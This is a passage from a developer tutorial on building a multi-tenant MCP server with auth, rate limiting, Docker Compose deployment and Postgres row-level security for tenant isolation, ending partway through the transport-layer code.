---
title: "Building the 11 Layers of a Production-Grade MCP Server + Agentic System"
source: "https://medium.com/gitconnected/building-the-11-layers-of-a-production-grade-mcp-server-agentic-system-de92127aca6f"
author:
  - "[[Fareed Khan]]"
published: 2026-04-21
created: 2026-05-02
description: "multi-tenant isolation, auth, rate limits, audit trails, approval gates and more"
tags:
  - "clippings"
---
## multi-tenant isolation, auth, rate limits, audit trails, approval gates and more

Read this story for free: [link](https://medium.com/@fareedkhandev/de92127aca6f?sk=2451bcff9c95b9ae7c779331db9397d3)

**MCP servers are becoming the core focus of production agentic systems** because they are where all the hard problems actually live: multi-tenant isolation, auth, rate limits, audit trails, and approval gates for destructive operations. Without them, agents leak data across tenants, burn budgets in runaway loops, and commit to refunds no human approved. An MCP server solves this by sitting between the agents and the data layer as a single secure tool surface, turning every agent call into an authenticated, policy-checked, rate-limited, audited operation before it touches a single row …

![](https://miro.medium.com/v2/resize:fit:4800/format:webp/1*vPJ1Xag-f3cgOgSA4QTeXQ.png)

MCP Server + Agentic System (Created by Fareed Khan )

In this blog, we are going to build **Atlas-MCP**, a production-grade MCP server organized around twelve components that keep showing up on the 3 AM pager when teams skip them. On top of the server, we are also going to build a **four-agent support copilot** (Planner, Retriever, Synthesizer, Critic) that uses the server’s tools to answer real customer support tickets end to end.

There are **two key aspects** that any production MCP server must handle.

1. The first is **agent behavior**, tool selection accuracy, argument validation, citation correctness, and the ability to recover from structured errors without hallucinating.
2. The second is **infrastructure reliability**, multi-tenant isolation, authentication, rate limiting, caching, circuit breaking, observability, and human approval gates for destructive operations.

**Both are non-negotiable before you let an agent anywhere near a production database.**

All the code is available in my GitHub Repository:

## [GitHub - FareedKhan-dev/production-grade-mcp-agentic-system: Building a Production-Grade MCP Server…](https://github.com/FareedKhan-dev/production-grade-mcp-agentic-system/?source=post_page-----de92127aca6f---------------------------------------)

### Building a Production-Grade MCP Server Architecture with a Multi-Agent System …

github.com

## Table of Content

## Creating Modular Codebase

Normally, Python MCP servers start with a single `server.py` and a handful of `@tool` decorators. As soon as you add authentication, rate limiting, multiple backends, and tenant isolation, **that single file becomes unmaintainable**.

> For production-grade MCP servers we follow a **Modular Architecture** pattern where every concern lives in its own package.

Auth does not know about caching, caching does not know about rate limiting, and the tool execution engine talks to each of them through narrow interfaces.

Let’s look at the structured layout we are going to build …

```c
src/atlas_mcp/
├── __init__.py
├── config.py                    # Central settings, singleton
├── server.py                    # Component 1: Transport & session
├── agents/                      # Multi-agent copilot layer
│   ├── base.py
│   ├── planner.py
│   ├── retriever.py
│   ├── synthesizer.py
│   ├── critic.py
│   ├── orchestrator.py
│   └── mcp_client.py
├── auth/                        # Components 2 & 3: AuthN + AuthZ
│   ├── oauth.py
│   ├── middleware.py
│   └── policy.py
├── cache/                       # Component 9: Two-tier cache
├── errors/                      # Component 10: SERF framework
├── governance/                  # Component 12: Tenant + approvals
├── observability/               # Component 11: Tracing, metrics, audit
├── ratelimit/                   # Component 8: Redis token bucket
├── reliability/                 # Component 7: Circuit breaker, retry, ATBA
├── tools/                       # Components 4 & 6: Registry + execution
│   ├── atomic/
│   ├── composed/
│   └── workflow/
└── validation/                  # Component 5: Tool envelope schema
```

**This directory structure looks big but every folder maps cleanly to one of the twelve production components.** Each module is responsible for one layer and can be tested, replaced, or understood in isolation.

- `agents/` holds the four-agent copilot that sits on top of the MCP server.
- `auth/` splits authentication (who are you) from authorization (what are you allowed to do).
- `tools/` is itself tiered into atomic, composed, and workflow tools.
- `reliability/`, `ratelimit/`, `cache/`, `observability/` are the infrastructure guards that wrap every tool call.

We are going to build each of these step by step in the upcoming sections.

### Managing Dependencies

The very first thing a production project needs is a proper dependency management strategy. For simple scripts, a `requirements.txt` is fine. For anything that is going to have multiple contributors, multiple environments, and a build pipeline, we use `pyproject.toml` which follows PEP 621 and gives us dependency groups, build configuration, and tool settings in one file.

![](https://miro.medium.com/v2/resize:fit:4800/format:webp/1*NW_NWt4FlvX-mT0rr6Gczg.png)

Managing Dependencies (Created by Fareed Khan )

Let’s create our `pyproject.toml` and start with the project metadata:

```c
[project]
name = "atlas-mcp"
version = "0.1.0"
description = "A production-grade MCP server for enterprise agents."
readme = "README.md"
requires-python = ">=3.11"
license = { text = "MIT" }
 = [{ name = "Atlas-MCP Contributors" }]
```

This block declares the package name, version, minimum Python version, and license. The `requires-python = ">=3.11"` is deliberate because we rely on 3.11 features like `StrEnum` and the improved asyncio APIs.

Next comes the core runtime dependencies. Since we are building a stateful MCP server with transport, auth, rate limiting, data layer, observability, and reliability, we need a careful list of libraries.

```c
dependencies = [
  # MCP core
  "mcp>=1.2.0",

  # Transport & server
  "starlette>=0.37",
  "uvicorn[standard]>=0.30",
  "httpx>=0.27",
  
  # Validation & config
  "pydantic>=2.7",
  "pydantic-settings>=2.3",
  "pyyaml>=6.0",
  
  # Auth
  "authlib>=1.3",
  "pyjwt[crypto]>=2.9",

  # Infra clients
  "asyncpg>=0.29",
  "redis[hiredis]>=5.0",
  "elasticsearch[async]>=8.14",
  "boto3>=1.34",
  "aioboto3>=13.0",

  # Reliability
  "tenacity>=8.5",

  # Observability
  "opentelemetry-api>=1.25",
  "opentelemetry-sdk>=1.25",
  "opentelemetry-exporter-otlp>=1.25",
  "opentelemetry-instrumentation-starlette>=0.46b0",
  "prometheus-client>=0.20",
  "structlog>=24.2",
]
```

Notice that we group our dependencies by concern using comments.

> This is important because when a new engineer joins the team, they can immediately see which library belongs to which layer.

The MCP SDK gives us the protocol, Starlette and Uvicorn give us the HTTP transport, `pyjwt` and `authlib` handle token validation, `asyncpg` and `redis` are the async drivers for our data layer, and the OpenTelemetry stack gives us tracing.

We also need to separate **development dependencies** from runtime dependencies using optional groups:

```c
[project.optional-dependencies]
dev = [
  "pytest>=8.2",
  "pytest-asyncio>=0.23",
  "pytest-cov>=5.0",
  "ruff>=0.5",
  "mypy>=1.10",
  "httpx>=0.27",
]
```

This way, running `pip install -e .` gives you just the runtime dependencies, and `pip install -e .[dev]` gives you the test and lint tools on top. On a production image you don't want pytest and mypy shipping.

Then we declare the entry points for our CLI tools:

```c
[project.scripts]
atlas-mcp = "atlas_mcp.server:main"
atlas-copilot = "atlas_mcp.agents.cli:main"
```

After `pip install`, this gives the user two commands on their PATH. `atlas-mcp` starts the server, `atlas-copilot` runs the four-agent support copilot against a running server. Having console scripts declared here means we do not need a separate `bin/` directory or wrapper shell scripts.

Finally, we configure our build system and tooling:

```c
[build-system]
requires = ["hatchling"]
build-backend = "hatchling.build"

[tool.hatch.build.targets.wheel]
packages = ["src/atlas_mcp"]

[tool.ruff]
line-length = 100
target-version = "py311"

[tool.pytest.ini_options]
asyncio_mode = "auto"
testpaths = ["tests"]
```

`hatchling` is a modern build backend that handles the `src/` layout cleanly. `ruff` is our linter (one fast tool replacing `flake8`, `isort`, and `pyupgrade`), pinned to Python 3.11. Pytest is set to auto async mode so we do not have to decorate every async test.

### Setting Environment Configuration

Now we need a configuration strategy. The standard beginner approach is to read `os.environ` directly everywhere, which leads to typos, missing defaults, and configuration drift between environments.

The production approach is **Settings Management**: a single typed object that reads from environment variables, validates them, and exposes them to the rest of the code. We use Pydantic Settings for this.

![](https://miro.medium.com/v2/resize:fit:4800/format:webp/1*ZEYph7i95_5ZDfpYFA9C2A.png)

Setting Environment Configuration (Created by Fareed Khan )

But first, we need a `.env.example` file so new contributors know what variables exist and what they are for. Let's start with the transport and auth sections:

```c
# ── Transport (Component 1) ───────────────────────────────────────
ATLAS_TRANSPORT=http
ATLAS_HTTP_HOST=0.0.0.0
ATLAS_HTTP_PORT=8080
ATLAS_STATELESS_MODE=true

# ── Auth (Component 2) ────────────────────────────────────────────
# Point these at your authorization server (WorkOS AuthKit, Auth0,
# Descope, Keycloak, or your own OAuth 2.1 provider).
ATLAS_AUTH_ISSUER=https://auth.atlas.local
ATLAS_AUTH_AUDIENCE=atlas-mcp
ATLAS_AUTH_JWKS_URL=https://auth.atlas.local/.well-known/jwks.json
ATLAS_AUTH_REQUIRE_PKCE=true
ATLAS_AUTH_ACCESS_TOKEN_TTL_SECONDS=900
```

`ATLAS_STATELESS_MODE=true` is the critical flag. It tells the Streamable HTTP session manager that no session state lives in process memory, which means a load balancer can route any request to any replica. **This is the 2026 MCP roadmap top production fix**.

**For auth, we never store tokens or secrets here. We only store the URL of our external authorization server**. Atlas-MCP is a **resource server**, not an authorization server, and this separation is load-bearing. We will dig into this in **section 4 (Authentication, Policy & Governance**).

Next comes authorization and reliability:

```c
# ── Authorization (Component 3) ───────────────────────────────────
ATLAS_POLICY_DEFAULT_DENY=true
ATLAS_POLICY_FILE=config/policy.yaml

# ── Reliability (Component 7) ─────────────────────────────────────
ATLAS_CIRCUIT_BREAKER_FAILURE_THRESHOLD=5
ATLAS_CIRCUIT_BREAKER_RECOVERY_SECONDS=30
ATLAS_RETRY_MAX_ATTEMPTS=3
ATLAS_ATBA_TOTAL_BUDGET_MS=30000
```

`ATLAS_POLICY_DEFAULT_DENY=true` is a security default we never turn off. If no rule in `policy.yaml` explicitly allows a tool call, the call is rejected. This is the only safe default for a system that agents drive.

The reliability settings tune our circuit breaker (5 failures in the window before opening, 30 seconds before probing recovery), our retry policy (3 attempts max), and our ATBA (Adaptive Timeout Budget Allocation) total budget of 30 seconds per agent turn.

> These numbers matter, an agent that takes 90 seconds to answer is a copilot nobody uses.

Then the rate limiting, caching, observability, governance, and data layer:

```c
# ── Rate limiting (Component 8) ───────────────────────────────────
ATLAS_RATE_LIMIT_DEFAULT_RPM=60
ATLAS_RATE_LIMIT_BURST=20
ATLAS_REDIS_URL=redis://redis:6379/0

# ── Cache (Component 9) ───────────────────────────────────────────
ATLAS_CACHE_L1_MAX_ITEMS=10000
ATLAS_CACHE_L1_TTL_SECONDS=60
ATLAS_CACHE_L2_TTL_SECONDS=600

# ── Observability (Component 11) ──────────────────────────────────
ATLAS_OTEL_ENDPOINT=http://otel-collector:4317
ATLAS_SERVICE_NAME=atlas-mcp
ATLAS_LOG_LEVEL=INFO
ATLAS_METRICS_ENABLED=true
ATLAS_AUDIT_LOG_PATH=/var/log/atlas/audit.jsonl

# ── Governance (Component 12) ─────────────────────────────────────
ATLAS_TENANT_HEADER=X-Tenant-Id
ATLAS_REQUIRE_TENANT=true
ATLAS_DESTRUCTIVE_TOOL_REQUIRES_APPROVAL=true

# ── Data layer ────────────────────────────────────────────────────
ATLAS_POSTGRES_DSN=postgresql://atlas:atlas@postgres:5432/atlas
ATLAS_ELASTICSEARCH_URL=http://elasticsearch:9200
ATLAS_S3_ENDPOINT=http://minio:9000
ATLAS_S3_BUCKET=atlas-mcp-data
ATLAS_VECTOR_DB_URL=http://qdrant:6333
```

The rate limiter defaults to 60 requests per minute per tenant-tool pair, with a burst of 20. The cache has two tiers …

1. L1 in-process with 10k items and 60s TTL.
2. L2 in Redis with a longer 600s TTL.

Observability points at an OTel collector. Governance requires a tenant header on every call and gates destructive tools behind approvals.

Now we consume these variables with a single typed settings class. Let’s create `app/core/config.py`:

```c
"""Central configuration for Atlas-MCP.
Every subsystem pulls its settings from here so that the twelve components
have one shared source of truth, and so that nothing reads os.environ directly.
"""

from __future__ import annotations
from functools import lru_cache
from typing import Literal
from pydantic import Field
from pydantic_settings import BaseSettings, SettingsConfigDict

class ServerSettings(BaseSettings):
    """Top-level server configuration."""
    model_config = SettingsConfigDict(env_prefix="ATLAS_", env_file=".env", extra="ignore")
```

The `env_prefix="ATLAS_"` tells Pydantic Settings to only load variables that start with `ATLAS_`, so our config never accidentally reads unrelated environment variables from the host. The `env_file=".env"` allows local development without setting environment variables manually.

Next, we declare each setting as a typed attribute, grouped by component:

```c
# ── Component 1: Transport ──────────────────────────────────────
    transport: Literal["stdio", "http"] = "http"
    http_host: str = "0.0.0.0"
    http_port: int = 8080
    stateless_mode: bool = True

# ── Component 2: Authentication ─────────────────────────────────
    auth_issuer: str = "https://auth.atlas.local"
    auth_audience: str = "atlas-mcp"
    auth_jwks_url: str = "https://auth.atlas.local/.well-known/jwks.json"
    auth_signing_key_path: str | None = None
    auth_require_pkce: bool = True
    auth_access_token_ttl_seconds: int = 900  # 15 minutes

    # ── Component 3: Authorization ──────────────────────────────────
    policy_default_deny: bool = True
    policy_file: str = "config/policy.yaml"
```

Every attribute has a default so the server can boot in a local dev environment without a `.env` file at all. The `Literal["stdio", "http"]` type is important, Pydantic will reject an invalid transport at startup instead of letting you discover it at runtime.

The reliability and rate limit sections follow the same pattern:

```c
# ── Component 7: Reliability ────────────────────────────────────
    circuit_breaker_failure_threshold: int = 5
    circuit_breaker_recovery_seconds: int = 30
    retry_max_attempts: int = 3
    retry_base_delay_ms: int = 100
    atba_total_budget_ms: int = 30_000

# ── Component 8: Rate limiting ──────────────────────────────────
    rate_limit_default_rpm: int = 60
    rate_limit_burst: int = 20
    redis_url: str = "redis://localhost:6379/0"

    # ── Component 9: Caching ────────────────────────────────────────
    cache_l1_max_items: int = 10_000
    cache_l1_ttl_seconds: int = 60
    cache_l2_ttl_seconds: int = 600
```

Finally, we expose a `get_settings()` function that returns a cached singleton:

```c
@lru_cache(maxsize=1)
def get_settings() -> ServerSettings:
    """Module-level singleton, read once, used everywhere."""
    return ServerSettings()
```

The `@lru_cache(maxsize=1)` makes this a singleton. Every module that imports `get_settings()` gets the same `ServerSettings` instance, so reading environment variables only happens once at startup.

### Containerization Strategy

Now we need to actually run this thing. A production MCP server does not run alone, it needs Postgres for the data, Elasticsearch for full-text search, Redis for rate limiting and cache, a vector DB (Qdrant), S3 storage (MinIO locally), plus an OTel collector and Jaeger and Prometheus and Grafana.

![](https://miro.medium.com/v2/resize:fit:2000/format:webp/1*CI7Qox2g-wZgL-HZsPRsRg.png)

Containerization (Created by Fareed Khan )

We orchestrate all of this with **Docker Compose**. Let’s build `docker-compose.yml` service by service.

First, the Atlas-MCP application itself:

```c
services:
  atlas-mcp:
    build: .
    image: atlas-mcp:dev
    restart: unless-stopped
    env_file: .env
    ports: ["8080:8080"]
    depends_on:
      postgres:      { condition: service_healthy }
      redis:         { condition: service_healthy }
      elasticsearch: { condition: service_healthy }
      qdrant:        { condition: service_started }
      minio:         { condition: service_started }
      otel-collector: { condition: service_started }
    volumes:
      - atlas-logs:/var/log/atlas
      - ./config:/app/config:ro
```

Notice the `depends_on` with `condition: service_healthy` …

1. This is important, Atlas-MCP cannot boot until Postgres, Redis, and Elasticsearch are not just *running* but also *ready to accept connections*.
2. Each of those services has a healthcheck we will define below, and Docker Compose will not start `atlas-mcp` until those healthchecks pass.

The `./config:/app/config:ro` mount is read-only so the policy YAML file cannot be mutated from inside the container. Policy is a security boundary and we do not want an application bug to be able to rewrite it.

Next, Postgres with a healthcheck:

```c
postgres:
    image: postgres:16-alpine
    restart: unless-stopped
    environment:
      POSTGRES_DB: atlas
      POSTGRES_USER: atlas
      POSTGRES_PASSWORD: atlas
    ports: ["5432:5432"]
    volumes:
      - pgdata:/var/lib/postgresql/data
      - ./deploy/sql/init.sql:/docker-entrypoint-initdb.d/init.sql:ro
    healthcheck:
      test: ["CMD-SHELL", "pg_isready -U atlas"]
      interval: 5s
      timeout: 3s
      retries: 10
```

The `init.sql` mount into `/docker-entrypoint-initdb.d/` is a Postgres convention. Any `.sql` file dropped there gets executed on first boot, so our schema and RLS policies are created automatically. We will write that SQL in the next section.

Then Redis, Elasticsearch, Qdrant, and MinIO:

```c
redis:
    image: redis:7-alpine
    restart: unless-stopped
    ports: ["6379:6379"]
    healthcheck:
      test: ["CMD", "redis-cli", "ping"]
      interval: 5s
      timeout: 3s
      retries: 10

  elasticsearch:
    image: docker.elastic.co/elasticsearch/elasticsearch:8.14.0
    restart: unless-stopped
    environment:
      discovery.type: single-node
      xpack.security.enabled: "false"
      ES_JAVA_OPTS: "-Xms512m -Xmx512m"
    ports: ["9200:9200"]
    volumes: [esdata:/usr/share/elasticsearch/data]
    healthcheck:
      test: ["CMD-SHELL", "curl -fsS http://localhost:9200/_cluster/health | grep -E 'green|yellow'"]
      interval: 10s
      timeout: 5s
      retries: 10

  qdrant:
    image: qdrant/qdrant:v1.11.0
    restart: unless-stopped
    ports: ["6333:6333"]
    volumes: [qdata:/qdrant/storage]

  minio:
    image: minio/minio:RELEASE.2024-08-17T01-24-54Z
    restart: unless-stopped
    command: server /data --console-address ":9001"
    environment:
      MINIO_ROOT_USER: minioadmin
      MINIO_ROOT_PASSWORD: minioadmin
    ports: ["9000:9000", "9001:9001"]
    volumes: [miniodata:/data]
```

For local dev, we disable Elasticsearch security (`xpack.security.enabled: "false"`) because the point is a fast feedback loop, not a realistic prod simulation. In production you would use managed Elasticsearch with full auth. **MinIO is our S3-compatible storage for local dev, swapped for real S3 in AWS**.

> Now the **observability stack**. An MCP server without observability is flying blind, and you will be debugging agent misbehavior from memory instead of traces:

```c
otel-collector:
    image: otel/opentelemetry-collector-contrib:0.103.0
    restart: unless-stopped
    command: ["--config=/etc/otel/config.yaml"]
    volumes:
      - ./deploy/otel/config.yaml:/etc/otel/config.yaml:ro
    ports:
      - "4317:4317"   # OTLP gRPC
      - "4318:4318"   # OTLP HTTP
    depends_on: [jaeger]

  jaeger:
    image: jaegertracing/all-in-one:1.58
    restart: unless-stopped
    environment:
      COLLECTOR_OTLP_ENABLED: "true"
    ports:
      - "16686:16686"  # UI

  prometheus:
    image: prom/prometheus:v2.53.0
    restart: unless-stopped
    volumes:
      - ./deploy/prometheus/prometheus.yml:/etc/prometheus/prometheus.yml:ro
    ports: ["9090:9090"]

  grafana:
    image: grafana/grafana:11.1.0
    restart: unless-stopped
    environment:
      GF_SECURITY_ADMIN_USER: admin
      GF_SECURITY_ADMIN_PASSWORD: admin
    ports: ["3000:3000"]
    depends_on: [prometheus]
```

**The flow is: Atlas-MCP exports OTLP spans to the OTel collector, the collector forwards them to Jaeger, and you view traces at** `localhost:16686`. Metrics go from Atlas-MCP to Prometheus directly **(scrape-based)**, and you visualize them in Grafana at `localhost:3000`.

Finally, the named volumes and networks:

```c
volumes:
  pgdata: {}
  esdata: {}
  qdata: {}
  miniodata: {}
  atlas-logs: {}
```

Each service gets a persistent named volume so data survives container restarts.

Now the `Dockerfile`. We use a **two-stage build**: a fat builder stage that compiles wheels, and a slim runtime stage that only carries what is needed to serve:

```c
# syntax=docker/dockerfile:1.6

# ── Stage 1: builder ──────────────────────────────────────────────
FROM python:3.11-slim AS builder
ENV PIP_NO_CACHE_DIR=1 PIP_DISABLE_PIP_VERSION_CHECK=1
RUN apt-get update && apt-get install -y --no-install-recommends \
      build-essential libssl-dev libffi-dev \
    && rm -rf /var/lib/apt/lists/*

WORKDIR /build
COPY pyproject.toml ./
COPY src ./src

RUN pip install --upgrade pip build && \
    pip wheel --wheel-dir /wheels .
```

The builder installs `build-essential`, `libssl-dev`, `libffi-dev` which are required to compile C extensions like `psycopg2` and `cryptography`. Then it builds wheels for every dependency, which are portable binary artifacts.

Then the runtime stage:

```c
# ── Stage 2: runtime ──────────────────────────────────────────────
FROM python:3.11-slim

ENV PYTHONUNBUFFERED=1 PYTHONDONTWRITEBYTECODE=1 \
    ATLAS_TRANSPORT=http ATLAS_HTTP_HOST=0.0.0.0 ATLAS_HTTP_PORT=8080
RUN apt-get update && apt-get install -y --no-install-recommends \
      curl ca-certificates tini \
    && rm -rf /var/lib/apt/lists/*

# Non-root user, production servers never run as root.
RUN useradd --system --uid 10001 --home /app atlas
WORKDIR /app
COPY --from=builder /wheels /wheels
RUN pip install --no-index --find-links=/wheels atlas-mcp && rm -rf /wheels

# Config and log directories.
RUN mkdir -p /app/config /var/log/atlas && chown -R atlas:atlas /app /var/log/atlas
COPY --chown=atlas:atlas config/ /app/config/
USER atlas
EXPOSE 8080

HEALTHCHECK --interval=10s --timeout=3s --start-period=15s --retries=3 \
    CMD curl -fsS http://localhost:8080/healthz || exit 1

ENTRYPOINT ["/usr/bin/tini", "--"]
CMD ["atlas-mcp"]
```

Three things to notice here …

1. First, `useradd --system --uid 10001` creates a non-root user. **Production servers never run as root**. A container escape from a root process is a host compromise, an escape from a non-root process is contained.
2. Second, `tini` as the entrypoint handles PID 1 responsibilities properly, zombie reaping, signal forwarding. Python processes are notorious for not handling SIGTERM gracefully on their own.
3. Third, the `HEALTHCHECK` pings our `/healthz` endpoint. Docker and Kubernetes use this to decide if the container is healthy, and an unhealthy container gets replaced automatically.

So far, we have a modular codebase, a typed settings layer, and a full Docker Compose stack with healthchecks and observability.

## Building the Data Persistence Layer

Normally in tutorial projects, the database is just a place to stick data. In production multi-tenant systems, the database is the **last line of defense against cross-tenant leaks**.

[Asana’s MCP-powered feature leaked customer data across 1,000 organisations](https://www.bleepingcomputer.com/news/security/asana-warns-mcp-ai-feature-exposed-customer-data-to-other-orgs/) because tenant isolation was enforced at the application layer only. A single application bug bypassed the isolation.

![](https://miro.medium.com/v2/resize:fit:2000/format:webp/1*kT_lhnF50R4aM2iXXahMoA.png)

Data Persistance Layer (Created by Fareed Khan )

The lesson is clear …

> tenancy must be enforced at the database layer too, so that even if your app code is wrong, the database physically cannot return another tenant’s rows.

We are going to achieve this using **PostgreSQL Row-Level Security (RLS)**. Every table gets a policy that filters rows based on a session variable `app.tenant_id`, which the MCP server sets before every query.

### Schema Design for Multi Tenancy

Let’s create `deploy/sql/init.sql`. This file gets automatically executed by Postgres on first boot (remember the `docker-entrypoint-initdb.d` mount from section 1).

First, we enable pgcrypto for UUID generation:

```c
CREATE EXTENSION IF NOT EXISTS pgcrypto;
```

Then our three core tables. Every table has a `tenant_id` column. **This is non-negotiable in a multi-tenant system**:

```c
-- ── Core tables ───────────────────────────────────────────────────
CREATE TABLE customers (
    id          TEXT PRIMARY KEY,
    tenant_id   TEXT NOT NULL,
    name        TEXT NOT NULL,
    email       TEXT NOT NULL,
    tier        TEXT NOT NULL DEFAULT 'standard',
    created_at  TIMESTAMPTZ NOT NULL DEFAULT now()
);

CREATE TABLE orders (
    id           TEXT PRIMARY KEY,
    tenant_id    TEXT NOT NULL,
    customer_id  TEXT NOT NULL REFERENCES customers(id),
    status       TEXT NOT NULL,
    total_cents  BIGINT NOT NULL,
    currency     TEXT NOT NULL DEFAULT 'USD',
    created_at   TIMESTAMPTZ NOT NULL DEFAULT now()
);

CREATE INDEX idx_orders_customer ON orders(customer_id, created_at DESC);

CREATE TABLE documents (
    id         TEXT PRIMARY KEY,
    tenant_id  TEXT NOT NULL,
    title      TEXT NOT NULL,
    body       TEXT NOT NULL,
    url        TEXT,
    created_at TIMESTAMPTZ NOT NULL DEFAULT now()
);
```

We have `customers`, `orders`, and `documents`. The index on `orders(customer_id, created_at DESC)` is there because our support copilot frequently asks "give me this customer's 5 most recent orders", and without that index the query would scan the entire orders table.

### Row Level Security Enforcement

Now the important bit. We enable RLS on every table and define a policy that pins each query to the session’s `app.tenant_id`:

![](https://miro.medium.com/v2/resize:fit:4800/format:webp/1*wX5e1fUEFfJpIoOBuVKv8A.png)

Row Level Security Enforcement (Created by Fareed Khan )

```c
-- ── Row-level security ────────────────────────────────────────────
-- The MCP server runs \`SET LOCAL app.tenant_id = $1\` before every query;
-- the RLS policy below enforces that rows from other tenants are invisible
-- regardless of what SQL the agent tries to run.

ALTER TABLE customers ENABLE ROW LEVEL SECURITY;
ALTER TABLE orders    ENABLE ROW LEVEL SECURITY;
ALTER TABLE documents ENABLE ROW LEVEL SECURITY;

CREATE POLICY tenant_isolation_customers ON customers
    USING (tenant_id = current_setting('app.tenant_id', true));

CREATE POLICY tenant_isolation_orders ON orders
    USING (tenant_id = current_setting('app.tenant_id', true));

CREATE POLICY tenant_isolation_documents ON documents
    USING (tenant_id = current_setting('app.tenant_id', true));
```

Let’s understand what is happening here.

1. `ALTER TABLE customers ENABLE ROW LEVEL SECURITY` turns on RLS for the table. After this, *any* query against `customers` gets filtered by the active policies.
2. `CREATE POLICY tenant_isolation_customers ON customers USING (tenant_id = current_setting('app.tenant_id', true))` defines the filter. The `current_setting('app.tenant_id', true)` reads a session variable, and the `true` second argument means "return NULL instead of raising if the variable is not set".
3. Our MCP server calls `SET LOCAL app.tenant_id = $1` at the start of every database transaction. From that point on, the RLS policy automatically scopes every query.

**Even if an agent manages to construct a query like** `**SELECT * FROM customers**`**, Postgres will only return rows where** `**tenant_id**` **matches the session variable**.

> A prompt injection that tries to cross-tenant read is physically impossible at the database level. This is what "defence in depth" means.

### Seeding Sample Tenant Data

Finally, we seed sample data for two tenants (`acme` and `globex`) so we can demo the multi-tenant behavior:

![](https://miro.medium.com/v2/resize:fit:4800/format:webp/1*kmeY_d2jXRjKseA1Qt-sQA.png)

Seeding Sample Tenant Data (Created by Fareed Khan )

```c
-- ── Sample data for two tenants ───────────────────────────────────
INSERT INTO customers (id, tenant_id, name, email, tier) VALUES
    ('CUST-1001', 'acme',   'Alicia Rivera', 'alicia@example.com', 'gold'),
    ('CUST-1002', 'acme',   'Ben Wallace',   'ben@example.com',    'standard'),
    ('CUST-2001', 'globex', 'Cho Nakamura',  'cho@example.com',    'gold');

INSERT INTO orders (id, tenant_id, customer_id, status, total_cents) VALUES
    ('o_9001', 'acme',   'CUST-1001', 'delivered',         12900),
    ('o_9002', 'acme',   'CUST-1001', 'refund_pending',    4900),
    ('o_9003', 'acme',   'CUST-1002', 'shipped',           29900),
    ('o_9101', 'globex', 'CUST-2001', 'delivered',         8900);

INSERT INTO documents (id, tenant_id, title, body, url) VALUES
    ('doc_refund_policy', 'acme',
     'Refund policy',
     'Refunds are issued within 5 business days of receiving the returned item.',
     'https://acme.example/refunds'),
    ('doc_shipping', 'acme',
     'Shipping timelines',
     'Standard shipping is 3-5 business days. Express is 1-2.',
     'https://acme.example/shipping');
```
1. Acme has two customers, three orders, and two help articles. Globex has one customer and one order.
2. When our support copilot runs with `tenant=acme`, it cannot see Cho Nakamura or order `o_9101`, not because our code hides them, but because Postgres will not return them at all.

So far, we have a schema where tenancy is a first-class column on every table, RLS policies that enforce isolation at the database level, and sample data for two separate tenants. **The database has become the bottom of our security pyramid, and anything above it has the database as a safety net**.

## Transport & Session Layer

We have our dependencies, our settings, our database. Now we need the actual server that accepts MCP requests.

![](https://miro.medium.com/v2/resize:fit:2000/format:webp/1*7GEV6AlegLbxX-dqJXHUdA.png)

Transport and Session Layer (Created by Fareed Khan )

MCP has two transports you need to support on day one.

1. **stdio** for local hosts like Claude Desktop and Cursor, where the client launches the server as a subprocess and talks over stdin/stdout.
2. **Streamable HTTP** for remote deployments, multi-user access, and horizontal scaling, where clients connect over HTTP/SSE.

The same tool registry, auth middleware, and business logic feed both transports. Only the wiring at the edge changes.

### Dual Transport Support

Let’s start building `src/atlas_mcp/server.py`. First, the imports:

![](https://miro.medium.com/v2/resize:fit:4800/format:webp/1*LbjI30iAJ9U4GEoda4BjGA.png)

Dual Transport Support (Created by Fareed Khan )

```c
"""Component 1, Transport & Session Layer.
Atlas-MCP ships two transports from day one:
* stdio, for local development and single-user MCP hosts like Claude Desktop.
* Streamable HTTP, for remote deployments, multi-user access, and horizontal scaling.
The same tool registry, auth, and middleware feed both transports. Only the
wiring at the edge changes.
"""

from __future__ import annotations
import asyncio
import logging

from contextlib import asynccontextmanager
from typing import AsyncIterator

import uvicorn

from mcp.server import Server
from mcp.server.stdio import stdio_server

from starlette.applications import Starlette
from starlette.middleware import Middleware
from starlette.routing import Mount, Route

from atlas_mcp.auth.middleware import AuthMiddleware
from atlas_mcp.cache.manager import CacheManager
from atlas_mcp.config import ServerSettings, get_settings
from atlas_mcp.errors.framework import ToolError, to_mcp_error
from atlas_mcp.governance.tenant import TenantMiddleware
from atlas_mcp.observability.metrics import MetricsRegistry, metrics_endpoint
from atlas_mcp.observability.tracing import init_tracing
from atlas_mcp.ratelimit.limiter import RateLimiter
from atlas_mcp.reliability.circuit_breaker import CircuitBreakerRegistry
from atlas_mcp.tools.registry import ToolRegistry
from atlas_mcp.validation.schemas import ToolCallEnvelope

logger = logging.getLogger(__name__)
```

The import list is a preview of the entire server. Every module we import maps to one of the twelve components we are going to build. This is the **glue file**, it does not implement any of those layers, it just wires them together.

Now the core `AtlasServer` class. This is the thing that holds everything together:

```c
class AtlasServer:
    """The glue that holds the twelve components together.

    This is intentionally thin, each component is its own module. The server
    owns the lifecycle (startup / shutdown) and the request path (validate →
    authorize → rate-limit → cache → execute → audit).
    """

    def __init__(self, settings: ServerSettings):
        self.settings = settings
        self.mcp = Server(settings.service_name)

        # Shared singletons used across requests.
        self.registry = ToolRegistry()
        self.cache = CacheManager(settings)
        self.limiter = RateLimiter(settings)
        self.breakers = CircuitBreakerRegistry(settings)
        self.metrics = MetricsRegistry()
        self._register_mcp_handlers()
```

Every component is instantiated **once** at server startup and shared across every request. This is important because things like the Redis connection pool, the L1 cache, and the circuit breaker state must be shared, not recreated per request.

**If we instantiated a new** `RateLimiter` **on every call, the token bucket would always be full and the limiter would be useless.**

### Stateless Session Management

Now we register the two MCP protocol handlers. MCP clients only really need two things: `list_tools` (what can I call) and `call_tool` (actually do it).

![](https://miro.medium.com/v2/resize:fit:2000/format:webp/1*19hnt3-kEnNKM090KaIXSw.png)

Stateless Session Management (Created by Fareed Khan )

```c
def _register_mcp_handlers(self) -> None:
        @self.mcp.list_tools()
        async def list_tools():  # type: ignore[misc]
            # Component 4: surface only tools the caller is allowed to see.
            ctx = _current_context()
            return self.registry.list_visible(tenant=ctx.tenant, scopes=ctx.scopes)

        @self.mcp.call_tool()
        async def call_tool(name: str, arguments: dict):  # type: ignore[misc]
            ctx = _current_context()
            envelope = ToolCallEnvelope(
                tool=name, arguments=arguments, tenant=ctx.tenant, caller=ctx.subject
            )
            try:
                return await self._dispatch(envelope)
            except ToolError as exc:
                # Component 10: translate our structured error into MCP's wire format.
                return to_mcp_error(exc)
```

Let’s understand what is happening.

